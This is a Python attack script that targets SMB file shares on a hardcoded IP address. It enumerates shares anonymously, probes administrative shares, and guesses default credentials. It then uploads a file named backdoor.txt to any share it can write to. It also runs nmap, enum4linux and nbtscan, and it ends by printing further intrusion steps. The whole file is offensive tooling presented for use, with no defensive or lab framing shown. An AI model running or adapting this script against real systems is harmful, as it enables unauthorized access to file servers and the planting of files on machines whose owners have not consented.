import subprocess
import os
import sys
import time

TARGET_IP = "12.13.14.3"
LOCAL_FILE = "backdoor.txt"

def print_banner():
    print("\n" + "="*60)
    print("SMB SHARE DISCOVERY AND EXPLOITATION")
    print(f"Target: {TARGET_IP}")
    print("="*60)

def discover_shares():
    """Discover all available SMB shares"""
    print("\n[*] Discovering SMB shares...")
    
    # Method 1: smbclient -L (list shares)
    print("[*] Method 1: smbclient -L")
    cmd = f"smbclient -L //{TARGET_IP}/ -N"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    shares = []
    
    if result.returncode == 0:
        print("[+] Share listing successful!")
        for line in result.stdout.split('\n'):
            if 'Disk' in line:
                try:
                    share_name = line.split()[0]
                    shares.append(share_name)
                    print(f"   [+] Found: {line}")
                except:
                    pass
    else:
        print("[-] Failed to list shares")
        print(f"[*] Error: {result.stderr}")
    
    # Method 2: Try common shares
    print("\n[*] Method 2: Testing common shares")
    common_shares = [
        'share', 'public', 'files', 'data', 'docs',
        'C$', 'ADMIN$', 'D$', 'E$', 'print$',
        'NETLOGON', 'SYSVOL', 'IPC$', 'tmp', 'upload'
    ]
    
    for share in common_shares:
        if share not in shares:
            cmd = f"smbclient //{TARGET_IP}/{share} -N -c 'exit' 2>&1"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if 'Anonymous login successful' in result.stdout and 'NT_STATUS_BAD_NETWORK_NAME' not in result.stdout:
                print(f"   [+] {share}: Accessible anonymously")
                if share not in shares:
                    shares.append(share)
            else:
                print(f"   [-] {share}: Not accessible")
    
    return shares

def test_share_access(share_name):
    """Test if we can actually access and list a share"""
    print(f"\n[*] Testing access to share: {share_name}")
    
    # Try to list directory
    cmd = f"smbclient //{TARGET_IP}/{share_name} -N -c 'ls'"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    if result.returncode == 0:
        print(f"[+] Success! Can list {share_name}")
        print("[*] Contents:")
        print(result.stdout[:500])
        return True
    else:
        print(f"[-] Cannot list {share_name}")
        print(f"[*] Error: {result.stderr[:200] if result.stderr else 'Unknown'}")
        return False

def brute_force_with_common_creds():
    """Try common username/password combinations"""
    print("\n" + "="*60)
    print("[*] TRYING COMMON CREDENTIALS")
    print("="*60)
    
    # Common credentials to try
    credentials = [
        ("", ""),           # empty both
        ("guest", ""),      # guest empty
        ("anonymous", ""),  # anonymous empty
        ("test", ""),       # test empty
        ("user", ""),       # user empty
        ("admin", ""),      # admin empty
        ("administrator", ""),  # administrator empty
        ("", "guest"),      # empty user, guest password
        ("guest", "guest"), # guest guest
    ]
    
    for username, password in credentials:
        print(f"\n[*] Testing: '{username}':'{password if password else '(empty)'}'")
        
        # First test with IPC$
        cmd = f"smbclient //{TARGET_IP}/IPC$ -U '{username}%{password}' -c 'exit' 2>&1"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if 'session setup failed' not in result.stdout:
            print(f"[+] Credentials work!")
            
            # Now try to find accessible shares
            shares_cmd = f"smbclient -L //{TARGET_IP}/ -U '{username}%{password}' 2>&1"
            shares_result = subprocess.run(shares_cmd, shell=True, capture_output=True, text=True)
            
            if 'session setup failed' not in shares_result.stdout:
                print("[*] Available shares with these credentials:")
                print(shares_result.stdout[:1000])
                return username, password
    
    return None, None

def create_test_file():
    """Create a test file to upload"""
    if not os.path.exists(LOCAL_FILE):
        print(f"\n[*] Creating {LOCAL_FILE}...")
        with open(LOCAL_FILE, "w") as f:
            f.write("Test file for SMB upload\n")
            f.write(f"Created: {time.ctime()}\n")
            f.write(f"Target: {TARGET_IP}\n")
        print(f"[+] Created {LOCAL_FILE}")

def try_upload_to_share(share_name, username="", password=""):
    """Try to upload a file to a share"""
    print(f"\n[*] Attempting upload to {share_name}...")
    
    # Build command based on credentials
    if username or password:
        auth = f"-U '{username}%{password}'"
    else:
        auth = "-N"  # Anonymous
    
    # Test access first
    test_cmd = f"smbclient //{TARGET_IP}/{share_name} {auth} -c 'exit' 2>&1"
    test_result = subprocess.run(test_cmd, shell=True, capture_output=True, text=True)
    
    if 'session setup failed' in test_result.stdout or 'NT_STATUS_BAD_NETWORK_NAME' in test_result.stdout:
        print(f"[-] Cannot access {share_name}")
        return False
    
    # Try to upload
    upload_cmd = f"smbclient //{TARGET_IP}/{share_name} {auth} -c 'put {LOCAL_FILE}' 2>&1"
    print(f"[*] Command: {upload_cmd}")
    
    result = subprocess.run(upload_cmd, shell=True, capture_output=True, text=True)
    
    if 'putting file' in result.stdout or result.returncode == 0:
        print(f"[+] File uploaded to {share_name}!")
        print(f"[+] Path: \\\\{TARGET_IP}\\{share_name}\\{LOCAL_FILE}")
        return True
    else:
        print(f"[-] Upload failed")
        print(f"[*] Output: {result.stdout[:200]}")
        return False

def try_smb_version_attack():
    """Try different SMB versions and configurations"""
    print("\n" + "="*60)
    print("[*] TRYING DIFFERENT SMB CONFIGURATIONS")
    print("="*60)
    
    # Try different SMB versions
    smb_versions = ['SMB1', 'SMB2', 'SMB3']
    
    for version in smb_versions:
        print(f"\n[*] Testing with {version}...")
        
        if version == 'SMB1':
            opts = "--option='client min protocol=NT1' --option='client max protocol=NT1'"
        elif version == 'SMB2':
            opts = "--option='client min protocol=SMB2' --option='client max protocol=SMB2'"
        else:  # SMB3
            opts = "--option='client min protocol=SMB3' --option='client max protocol=SMB3'"
        
        cmd = f"smbclient -L //{TARGET_IP}/ -N {opts} 2>&1"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if 'Anonymous login successful' in result.stdout:
            print(f"[+] {version} works!")
            
            # Parse shares from output
            for line in result.stdout.split('\n'):
                if 'Disk' in line:
                    print(f"   Found: {line}")
        else:
            print(f"[-] {version} failed")

def try_other_tools():
    """Try other SMB enumeration tools"""
    print("\n" + "="*60)
    print("[*] TRYING OTHER ENUMERATION TOOLS")
    print("="*60)
    
    tools = [
        ("nmap SMB scripts", f"nmap --script smb-enum-shares.nse -p445 {TARGET_IP}"),
        ("nmap SMB OS discovery", f"nmap --script smb-os-discovery.nse -p445 {TARGET_IP}"),
        ("enum4linux", f"enum4linux -a {TARGET_IP} 2>&1 | head -50"),
        ("nbtscan", f"nbtscan {TARGET_IP}"),
    ]
    
    for tool_name, cmd in tools:
        print(f"\n[*] Running {tool_name}...")
        print(f"    Command: {cmd}")
        
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                print(f"    [+] Success:")
                print(result.stdout[:300])
            else:
                print(f"    [-] Failed or partial output:")
                print(result.stdout[:200])
        except subprocess.TimeoutExpired:
            print("    [!] Timeout")
        except Exception as e:
            print(f"    [!] Error: {e}")

def main():
    print_banner()
    
    # Create test file
    create_test_file()
    
    # Discover shares
    shares = discover_shares()
    
    if not shares:
        print("\n[-] No shares discovered")
        print("[*] Trying different SMB versions...")
        try_smb_version_attack()
        
        print("\n[*] Trying other tools...")
        try_other_tools()
        return
    
    print(f"\n[+] Discovered {len(shares)} shares: {shares}")
    
    # Try common credentials
    username, password = brute_force_with_common_creds()
    
    if username is not None:
        print(f"\n[+] Found working credentials: '{username}':'{password if password else '(empty)'}'")
        
        # Try to upload to discovered shares with these credentials
        for share in shares:
            if share != 'IPC$':
                if try_upload_to_share(share, username, password):
                    break
    else:
        print("\n[-] No common credentials work")
        
        # Try anonymous access to each share
        for share in shares:
            if share != 'IPC$':
                if test_share_access(share):
                    if try_upload_to_share(share):
                        break
    
    # Try other tools for more info
    try_other_tools()
    
    # Final recommendations
    print("\n" + "="*60)
    print("[*] NEXT STEPS")
    print("="*60)
    print("[*] If you still can't upload files:")
    print("    1. Try to find writable directories:")
    print(f"       smbclient //{TARGET_IP}/share -N -c 'ls'")
    print("    2. Try to create a directory:")
    print(f"       smbclient //{TARGET_IP}/share -N -c 'mkdir test'")
    print("    3. Look for configuration files:")
    print(f"       smbclient //{TARGET_IP}/share -N -c 'ls' | grep -i 'conf\|ini\|cfg'")
    print("    4. Try other services on the target:")
    print(f"       nmap -sV {TARGET_IP}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[-] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Error: {e}")
        sys.exit(1)
